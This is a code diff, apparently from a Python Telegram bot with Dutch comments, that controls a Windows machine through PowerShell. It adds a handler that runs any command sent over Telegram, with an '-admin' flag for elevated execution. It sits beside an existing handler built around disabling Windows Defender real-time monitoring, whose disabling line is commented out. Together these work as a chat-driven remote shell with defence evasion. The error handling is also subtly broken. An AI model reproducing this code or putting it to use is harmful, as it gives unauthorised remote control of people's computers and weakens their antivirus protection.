@@ -88,9 +88,39 @@ async def stopDefender_command(update: Update, context: ContextTypes.DEFAULT_TYP
     """
     # meld dat Windows defender uit is
     # powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
-    run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
+    run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled', True)
     commandOutput = run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
     await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
+
+async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    - run een custom powershell command
+    - custom commands moet je zelf typen via telegram chat
+    - return de powershell output om te zien als de command wel of niet was uitgevoerd\n
+    als er geen output is was het waarschijnlijk successvol\n
+    run deze command opnieuw met een command die kan controleren als dat wel zo was\n
+    """
+    # spaties na de command zorgen ervoor dat de command als losse list items opgeslagen worden in context.args
+    # maak een een list met maar 2 argumenten, waarvan de eerste aangeeft als admin rechtenb nodig zijn
+    args = command_list(context.args)
+
+    if len(args) < 1:
+        await update.message.reply_text("Geef tenimste 1 argument nadat je de command aanroept")
+        return
+    
+    try:
+        if len(args) == 1:
+            commandOutput = run_powershell_command(args[0])
+            await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
+            return
+        elif len(args) == 2 and args[0] == "-admin":
+            commandOutput = run_powershell_command(args[1], True)
+            await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
+            return
+    except ValueError:
+        await update.message.reply_text(f"Er is een fout opgetreden bij het uitvoeren: {ValueError}")
+        return
+
 
 async def log_error(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
